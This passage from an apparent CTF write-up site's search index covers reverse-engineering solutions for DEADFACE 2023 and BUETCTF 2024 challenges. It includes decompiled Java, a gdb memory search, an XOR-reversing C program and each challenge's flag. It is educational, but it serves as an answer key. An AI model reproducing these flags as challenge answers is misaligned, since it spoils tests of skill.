(and the flag), enter her entity (with special characters) as a password: asdfasf\nSorry, that is not the correct monster / cereal / password.  Please try again.\n</code></pre> <p>The jar file is easily decompiled with procyon-decompiler.</p> <pre><code>deadface/rev/cereal_killer_4 on \ue0a0 master [!?] via \u2615 v21 took 2s\n\u276f procyon-decompiler cereal.jar &gt; cereal.java\n</code></pre> <p>Here's the decompiled java file.</p> <p>The following code snippets are the interesting parts:</p> <pre><code>class CenoBytes\n{\n    public static void main(final String[] args) {\n        final byte[] kitbal = \"b7&amp;q76n=gW3&gt;RT?YXJcPb7*05YXJcPb7*05YXN?K3}_w=6n=hw3&gt;RT?YXJcPb7*056n+5#b7*05YXN?K3}#_+YXJcPb7*05YXJcPb7*f36n+5#b7*05YXJd%3&gt;O{^6n=hweHR{bYXJcPb7*05YXJcPb7*05YkqzKb7*05Ykq!y3&gt;RT?YXJcPb7*05YXJcPb7)}=6afJb3&gt;RT?YXJcP3&gt;O}9Yb$;Za~B&gt;B6ny~!FK8YO6n=gIb7*056n=hwb7*0GYYqVc4;LN{6n+5#4`^X&gt;6n=hw3}&lt;0-H+}&amp;D3&gt;O{^7k&amp;X&lt;3&gt;RT?Ykq!y3&gt;O{^6n=hwFKA(MHvxWr3&gt;O{^WB~yI3&gt;O{^6b@Yhb2J_eYkq!y3&gt;RSy6n=hw3&gt;Q6eYh3|;3}|k0YXJcP4`^X&gt;6n=hwb7)}=6n=hwd}v`V6kP!UFBcwiYXJd$a};4%7XbkQ3&gt;O_PYXMyW4;LPCYkdI$b7x@&lt;6n=dHa};3?YXJccb7)~MYXJd$3};~t6n=dHb7&amp;q77Y+dd3}_uLYkqzK4;OB76n+7H3}|5u6ajq!b7(z%YXN?K3}+n;6n=hwb7&amp;oMHvs`%b7&amp;n76n+5#4-_79YkqzK4`^X7WC0Eib7&amp;oMWB~zvb7x_46ajq!d}v{EYkdI$a~B&gt;CYXMyWa};56YYqVpb3$P*YXMyWb2MRcH-3H&amp;a~B?R7k&amp;-_d&gt;3wVYaam}b97;HWB~yIb2MRcYXN-$a}*v86kP!UFKB6UYaM&lt;cb75f)6nz1Gb7&amp;q76b@Yhb2MQNWB~yIFBBdP6ajq!d}v{EYXJcPa}+&amp;tYXNuxa};iJ6n+7HFKA&amp;dYkdv@b7*01WB~yIa}i;3YXJ!Xb95eTYX|`Wb2MRc7XblXb2MRcYj^&lt;x4`^X*YaanCb2J_eHvs`%3&gt;O{^V}5&gt;q3}|6}7k++zb7*dIYYqVpb7&amp;n66n=hw3&gt;RT?WPN^q3}|6&amp;6n&lt;R+a}*v86n+j}3&gt;O}9YYu&amp;W3&gt;RT?b$)(bb7(yc6n+kV3&gt;O}9Yaf1o3&gt;O{^6afJaFBcvSHvs_&amp;3&gt;O{^YXJ^^3^ZYKH-3Iy3}_t&lt;6n=hP3&gt;RT?WPN^q3&gt;R)L6n=hPb7*c26kP#b3&gt;O|QYXJ@ca};3?YbyZ(b7*05YXJcPb7*05YXJd$d}kgF6n=gVb7)}&gt;6n%aHb7*05YXJcP4`*R=YXJd$d}v{EYXJcPb7*05YXJcPa};iJYXJcP4`*R=YXJcPb7*05YXJcPa};iJYXJcPb7)}&gt;WB~yIb7)}&gt;WB~yIb7&amp;oXYXJcPb7*05YXJd$d}v{EYXJcP4`*R=YXJcPb7*05YXN-@b7*05YXJcPb7&amp;oXYXN=^3};~\".getBytes();\n        final byte[] amhoamho = \"DEADFACE\".getBytes();\n        final byte[] amho = \"7yZuW4pATQ\".getBytes();\n        final Scanner scanner = new Scanner(System.in);\n        System.out.println(\"lilith's favorite cereal is also her favorite monster / ghoul / daemon / phantasm / poltergeist / creature / extraterrestrial.\");\n        System.out.print(\"To get both answers (and the flag), enter her entity (with special characters) as a password: \");\n        final String sayongchaAmho = scanner.nextLine().trim();\n        final Base85.Z85Decoder zdecoder = new Base85.Z85Decoder();\n        final Base85.Rfc1924Decoder decoder = new Base85.Rfc1924Decoder();\n        final byte[] amhoDec = zdecoder.decode(amho);\n        for (int j = 0; j &lt; amhoDec.length; ++j) {\n            final int jdx = j % amhoamho.length;\n            final byte[] array = amhoDec;\n            final int n = j;\n            array[n] ^= amhoamho[jdx];\n        }\n        final String amhoDecStr = new String(amhoDec, StandardCharsets.UTF_8);\n        if (!amhoDecStr.equals(sayongchaAmho)) {\n            System.out.println(\"Sorry, that is not the correct monster / cereal / password.  Please try again.\");\n            System.exit(0);\n        }\n        final byte[] kitbalDec = decoder.decode(kitbal);\n        for (int i = 0; i &lt; kitbalDec.length; ++i) {\n            final int idx = i % amhoDec.length;\n            final byte[] array2 = kitbalDec;\n            final int n2 = i;\n            array2[n2] ^= amhoDec[idx];\n        }\n        final String kitbalStr = new String(kitbalDec, StandardCharsets.UTF_8);\n        System.out.println(\"If anyone has wisdom, let him / her decompile the Java code and crack the encrypted cereal!\");\n        System.out.println(\"Congratulations, Oh Wise One!\");\n        System.out.println(\"\");\n        System.out.println(kitbalStr);\n    }\n}\n</code></pre> <p>After reading the java code, it can be seen that our input(<code>sayongchaAmho</code>) is checked against <code>amhoDecStr</code> which is the UTF_8 decode of <code>amhoDec</code>. <code>amhoDec</code> is found by the following chain of functions on <code>amho</code>: Xor.Rotate(Base85.Z85Decoder(<code>amho</code>), <code>amhoamho</code>).</p> <p>For some reason, the cyberchef's zeroMQ(Z85) Base85 was not working. I might be wrong in how to use it there but got it working in dcode.fr. Then used xor in cyberchef to get the password.</p> <p></p> <p></p> <pre><code>deadface/rev/cereal_killer_4 on \ue0a0 master [!?] via \u2615 v21\n\u276f java -jar cereal.jar\nlilith's favorite cereal is also her favorite monster / ghoul / daemon / phantasm / poltergeist / creature / extraterrestrial.\nTo get both answers (and the flag), enter her entity (with special characters) as a password: SHARK!!!\nIf anyone has wisdom, let him / her decompile the Java code and crack the encrypted cereal!\nCongratulations, Oh Wise One!\n\n  _____.__                    ___ ________          __        ___.                .___         _________.__                  __      _____                 __  .__      ___\n_/ ____\\  | _____     ____   / /  \\_____  \\   _____/  |_  ____\\_ |__   ___________|   | ______/   _____/|  |__ _____ _______|  | __ /     \\   ____   _____/  |_|  |__    \\ \\\n\\   __\\|  | \\__  \\   / ___\\  \\ \\   /   |   \\_/ ___\\   __\\/  _ \\| __ \\_/ __ \\_  __ \\   |/  ___/\\_____  \\ |  |  \\\\__  \\\\_  __ \\  |/ //  \\ /  \\ /  _ \\ /    \\   __\\  |  \\   / /\n |  |  |  |__/ __ \\_/ /_/  &gt; &lt; &lt;  /    |    \\  \\___|  | (  &lt;_&gt; ) \\_\\ \\  ___/|  | \\/   |\\___ \\ /        \\|   Y  \\/ __ \\|  | \\/    &lt;/    Y    (  &lt;_&gt; )   |  \\  | |   Y  \\  &gt; &gt;\n |__|  |____(____  /\\___  /  / /  \\_______  /\\___  &gt;__|  \\____/|___  /\\___  &gt;__|  |___/____  &gt;_______  /|___|  (____  /__|  |__|_ \\____|__  /\\____/|___|  /__| |___|  /  \\ \\\n                 \\//_____/   \\_\\_         \\/     \\/                \\/     \\/               \\/        \\/      \\/     \\/           \\/       \\/            \\/          \\/  _/_/\n</code></pre> <p>flag: <code>flag{OctoberIsSharkMonth}</code></p>","tags":["rev","deadface"]},{"location":"writeups/2023/deadface/index.html#cereal-killer-05","title":"Cereal Killer 05","text":"","tags":["rev","deadface"]},{"location":"writeups/2023/deadface/index.html#description_3","title":"Description","text":"<p>Points: 50</p> <p>Created by: <code>TheZeal0t</code></p> <p>We think Dr. Geschichter of Lytton Labs likes to use his favorite monster cereal as a password for ALL of his accounts! See if you can figure out what it is, and keep it handy! Choose one of the binaries to work with.</p> <p>Enter the answer as flag{WHATEVER-IT-IS}.</p> <p>Download file</p>","tags":["rev","deadface"]},{"location":"writeups/2023/deadface/index.html#solution_3","title":"Solution","text":"<p>When the binary is run, it askes for Dr. Geschichter's favourite cereal and entity.</p> <pre><code>deadface/rev/cereal_killer_5 on \ue0a0 master [!?]\n\u276f ./cereal\nDr. Geschichter, just because he is evil, doesn't mean he doesn't have a favorite cereal.\nPlease enter the passphrase, which is based off his favorite cereal and entity: adsfadff\nnotf1aq{you-guessed-it---this-is-not-the-f1aq}\n</code></pre> <p>I don't know if it is the intended solution, I just ran the program in gdb, interrupted it when it asked for input and search for any string having <code>flag{}</code> and there it was, the flag.</p> <p><pre><code>deadface/rev/cereal_killer_5 on \ue0a0 master [!?]\n\u276f gdb cereal\nGNU gdb (GDB) 13.2\nCopyright (C) 2023 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\nType \"show copying\" and \"show warranty\" for details.\n[ Legend: Modified register | Code | Heap | Stack | String ]\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 registers \u2500\u2500\u2500\u2500\n$eax   : 0xfffffe00\n$ebx   : 0x0\n$ecx   : 0x5655a5b0  \u2192  0x00000000\n$edx   : 0x400\n$esp   : 0xffffc2c0  \u2192  0xffffc328  \u2192  0xffffc998  \u2192  0xffffcc38  \u2192  0x00000000\n$ebp   : 0xffffc328  \u2192  0xffffc998  \u2192  0xffffcc38  \u2192  0x00000000\n$esi   : 0xf7e20e34  \u2192  \"L\\r\"\"\n$edi   : 0xf7e207c8  \u2192  0x00000000\n$eip   : 0xf7fc7579  \u2192  &lt;__kernel_vsyscall+9&gt; pop ebp\n$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]\n$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 stack \u2500\u2500\u2500\u2500\n0xffffc2c0\u2502+0x0000: 0xffffc328  \u2192  0xffffc998  \u2192  0xffffcc38  \u2192  0x00000000      \u2190 $esp\n0xffffc2c4\u2502+0x0004: 0x00000400\n0xffffc2c8\u2502+0x0008: 0x5655a5b0  \u2192  0x00000000\n0xffffc2cc\u2502+0x000c: 0xf7d1e0d7  \u2192  0xfff0003d (\"=\"?)\n0xffffc2d0\u2502+0x0010: 0xf7e215c0  \u2192  0xfbad2288\n0xffffc2d4\u2502+0x0014: 0xf7e20e34  \u2192  \"L\\r\"\"\n0xffffc2d8\u2502+0x0018: 0xffffc328  \u2192  0xffffc998  \u2192  0xffffcc38  \u2192  0x00000000\n0xffffc2dc\u2502+0x001c: 0xf7c827b2  \u2192  &lt;_IO_file_underflow+674&gt; add esp, 0x10\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 code:x86:32 \u2500\u2500\u2500\u2500\n   0xf7fc7573 &lt;__kernel_vsyscall+3&gt; mov    ebp, esp\n   0xf7fc7575 &lt;__kernel_vsyscall+5&gt; sysenter\n   0xf7fc7577 &lt;__kernel_vsyscall+7&gt; int    0x80\n \u2192 0xf7fc7579 &lt;__kernel_vsyscall+9&gt; pop    ebp\n   0xf7fc757a &lt;__kernel_vsyscall+10&gt; pop    edx\n   0xf7fc757b &lt;__kernel_vsyscall+11&gt; pop    ecx\n   0xf7fc757c &lt;__kernel_vsyscall+12&gt; ret\n   0xf7fc757d &lt;__kernel_vsyscall+13&gt; int3\n   0xf7fc757e                  nop\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 threads \u2500\u2500\u2500\u2500\n[#0] Id 1, Name: \"cereal\", stopped 0xf7fc7579 in __kernel_vsyscall (), reason: SIGINT\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 trace \u2500\u2500\u2500\u2500\n[#0] 0xf7fc7579 \u2192 __kernel_vsyscall()\n[#1] 0xf7d1e0d7 \u2192 read()\n[#2] 0xf7c82690 \u2192 _IO_file_underflow()\n[#3] 0xf7c84f1a \u2192 _IO_default_uflow()\n[#4] 0xf7c62b63 \u2192 add esp, 0x10\n[#5] 0xf7c56df9 \u2192 __isoc99_scanf()\n[#6] 0x5655637a \u2192 main()\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  grep flag{\n[+] Searching 'flag{' in memory\n[+] In '[stack]'(0xfffdc000-0xffffe000), permission=rw-\n  0xffffca0b - 0xffffca2b  \u2192   \"flag{XENO-DO-DO-DO-DO-DO-DOOOOO}\"\ngef\u27a4\n</code></pre> flag: <code>flag{XENO-DO-DO-DO-DO-DO-DOOOOO}</code></p>","tags":["rev","deadface"]},{"location":"writeups/2023/deadface/index.html#my-daily-macros","title":"My Daily Macros","text":"","tags":["rev","deadface"]},{"location":"writeups/2023/deadface/index.html#description_4","title":"Description","text":"<p>Points: 70</p> <p>Created by: hotstovehove</p> <p>DEADFACE has gotten hold of the HR departments contact list and has been distributing it with a macro in it. There is a phrase the RE team would like for you to pull out of the macro.</p> <p>Submit the flag as flag{some_text}.</p> <p>Download file</p>","tags":["rev","deadface"]},{"location":"writeups/2023/deadface/index.html#solution_4","title":"Solution","text":"<p>I did not even know what a xlsm file is. And I as the time of writting this writeup, I am still unware what might it be. I opened it in vim and was able to navigate between files inside it like a folder structure. I started to look for any string with <code>flag{</code> in it. and found it in the <code>xl/vbaProject.bin</code>.</p> <pre><code>\" zip.vim version v32\n\" Browsing zipfile deadface/rev/macros/HR_List.xlsm\n\" Select a file with cursor and press ENTER\n\n[Content_Types].xml\n_rels/.rels\nxl/workbook.xml\nxl/_rels/workbook.xml.rels\nxl/worksheets/sheet1.xml\nxl/theme/theme1.xml\nxl/styles.xml\nxl/sharedStrings.xml\nxl/vbaProject.bin\ndocProps/core.xml\ndocProps/app.xml\n</code></pre> <p></p> <p>flag: <code>flag{youll_never_find_this_}</code></p>","tags":["rev","deadface"]},{"location":"writeups/2024/buetctf-preli/index.html","title":"BUETCTF 2024 preli","text":"","tags":["rev","buetctf"]},{"location":"writeups/2024/buetctf-preli/index.html#baby-rev","title":"Baby rev","text":"<p>Difficulty: easy chal</p> <p>5 directories, 3 files First let's see what the binary does by running it.</p> <pre><code>\u276f ./chal\nFLAG: asdfasdf\n\n\u276f ltrace ./chal\nprintf(\"FLAG: \")                                                                                   = 6\nfgets(FLAG: asdfasdf\n\"asdfasdf\\n\", 33, 0x7921be6488e0)                                                            = 0x7ffd63ba3660\nstrcspn(\"asdfasdf\\n\", \"\\n\")                                                                        = 8\n+++ exited (status 255) +++\n</code></pre> <p>So, from the ltrace, it is clear that the flag is being taken as input and something happens and we get an exit with 255 status code. Let's load the binary in ghidra and see what happens.</p> <p>After analysis is complete and a few renaming, we can see the following main function:</p> <pre><code>/* DISPLAY WARNING: Type casts are NOT being printed */\n\nlong main(void)\n\n{\n  int iVar1;\n  size_t sVar2;\n  long ret;\n  long in_FS_OFFSET;\n  char input [40];\n  long local_10;\n\n  local_10 = *(in_FS_OFFSET + 0x28);\n  printf(\"FLAG: \");\n  fgets(input,0x21,stdin);\n  sVar2 = strcspn(input,\"\\n\");\n  input[sVar2] = '\\0';\n  iVar1 = is_valid_flag(input);\n  if (iVar1 == 0) {\n    ret = 0xffffffff;\n  }\n  else {\n    ret = 0;\n  }\n  if (local_10 != *(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_chk_fail();\n  }\n  return ret;\n}\n</code></pre> <p>Let's look inside <code>is_valid_flag</code> function.</p> <pre><code>/* DISPLAY WARNING: Type casts are NOT being printed */\n\nlong is_valid_flag(char *input)\n\n{\n  long ret;\n  long in_FS_OFFSET;\n  uint i;\n  char obf [32];\n\n  obf[0] = 'B';\n  obf[1] = 'T';\n  obf[2] = 'G';\n  obf[3] = 'W';\n  obf[4] = 'G';\n  obf[5] = 'Q';\n  obf[6] = '@';\n  obf[7] = '|';\n  obf[8] = 'b';\n  obf[9] = '{';\n  obf[10] = 'd';\n  obf[11] = '}';\n  obf[12] = 'j';\n  obf[13] = 'K';\n  obf[14] = ':';\n  obf[15] = '@';\n  obf[16] = 'W';\n  obf[17] = '#';\n  obf[18] = 'j';\n  obf[19] = 'j';\n  obf[20] = 'Q';\n  obf[21] = '&amp;';\n  obf[22] = 'T';\n  obf[23] = '\\\\';\n  obf[24] = '*';\n  obf[25] = 'r';\n  obf[26] = 'J';\n  obf[27] = 'R';\n  obf[28] = 'K';\n  obf[29] = 'p';\n  obf[30] = 'm';\n  obf[31] = 'b';\n  i = 0;\n  do {\n    if (0x1f &lt; i) {\n      ret = 1;\nLAB_00101204:\n      if (*(in_FS_OFFSET + 0x28) != *(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n        __stack_chk_fail();\n      }\n      return ret;\n    }\n    if ((input[i] ^ i) != obf[i]) {\n      ret = 0;\n      goto LAB_00101204;\n    }\n    i = i + 1;\n  } while( true );\n}\n</code></pre> <p>We can see a very easy obfuscation is carried out inside a do-while loop. (It's actually a for loop. Ghidra just fails to recognize it as such.) We start from i=0 and go all the way up to 0x1f. We xor the character in index i of our input with the index and compare it with the obfuscated flag's corresponding character. If they are not equal, we return 0 (false) and if all of the checks pass, we return 1 (true).</p> <p>We can now reverse the logic and from the obfuscated flag, we can get the flag. We can do it because of xor's property. i.e, if a^b = c then a = b^c and also, b = a^c.</p> <p>The solution:</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main(){\n  char obf [32];\n\n  obf[0] = 'B';\n  obf[1] = 'T';\n  obf[2] = 'G';\n  obf[3] = 'W';\n  obf[4] = 'G';\n  obf[5] = 'Q';\n  obf[6] = '@';\n  obf[7] = '|';\n  obf[8] = 'b';\n  obf[9] = '{';\n  obf[10] = 'd';\n  obf[11] = '}';\n  obf[12] = 'j';\n  obf[13] = 'K';\n  obf[14] = ':';\n  obf[15] = '@';\n  obf[16] = 'W';\n  obf[17] = '#';\n  obf[18] = 'j';\n  obf[19] = 'j';\n  obf[20] = 'Q';\n  obf[21] = '&amp;';\n  obf[22] = 'T';\n  obf[23] = '\\\\';\n  obf[24] = '*';\n  obf[25] = 'r';\n  obf[26] = 'J';\n  obf[27] = 'R';\n  obf[28] = 'K';\n  obf[29] = 'p';\n  obf[30] = 'm';\n  obf[31] = 'b';\n  for(int i = 0; i &lt; 32; i++){\n    printf(\"%c\", obf[i] ^ i);\n  }\n}\n</code></pre> <p>We run it to get flag:</p> <pre><code>\u276f ./sol\nBUETCTF{jrnvfF4OG2xyE3BK2kPIWms}\n</code></pre> <p>flag: <code>BUETCTF{jrnvfF4OG2xyE3BK2kPIWms}</code></p>","tags":["rev","buetctf"]},{"location":"blog/index.html","title":"Blog","text":""},{"location":"blog/archive/2023.html","title":"2023","text":""},{"location":"tags.html","title":"Tags","text":""},{"location":"tags.html#backdoorctf","title":"backdoorCTF","text":"<ul> <li>backdoorCTF 2023</li> </ul>"},{"location":"tags.html#bcactf","title":"bcactf","text":"<ul> <li>bcactf 2023</li> </ul>"},{"location":"tags.html#blockchain","title":"blockchain","text":"<ul> <li>bcactf 2023</li> </ul>"},{"location":"tags.html#buetctf","title":"buetctf","text":"<ul> <li>BUETCTF 2024 preli</li> </ul>"},{"location":"tags.html#coderush","title":"coderush","text":"<ul> <li>Coderush 1.0</li> </ul>"},{"location":"tags.html#crypto","title":"crypto","text":"<ul> <li>bcactf 2023</li> </ul>"},{"location":"tags.html#deadface","title":"deadface","text":"<ul> <li>deadface CTF 2023</li> </ul>"},{"location":"tags.html#flaghunt","title":"flaghunt","text":"<ul> <li>Flaghunt 2022 by CTF_BD</li> </ul>"},{"location":"tags.html#format-string-vulnerability","title":"format string vulnerability","text":"<ul> <li>Coderush 1.0</li> </ul>"},{"location":"tags.html#integer-overflow","title":"integer overflow","text":"<ul> <li>Coderush 1.0</li> </ul>"},{"location":"tags.html#mkdocs","title":"mkdocs","text":"<ul> <li>Hello World</li> </ul>"},{"location":"tags.html#pwn","title":"pwn","text":"<ul> <li>Coderush 1.0</li> </ul>"},{"location":"tags.html#python-bytecode","title":"python bytecode","text":"<ul> <li>Flaghunt 2022 by CTF_BD</li> </ul>"},{"location":"tags.html#rev","title":"rev","text":"<ul> <li>Flaghunt 2022 by CTF_BD</li> <li>backdoorCTF 2023</li> <li>bcactf 2023</li> <li>Coderush 1.0</li> <li>deadface CTF 2023</li> <li>BUETCTF 2024 preli</li> </ul>"},{"location":"tags.html#web","title":"web","text":"<ul> <li>bcactf 2023</li> </ul>"}]}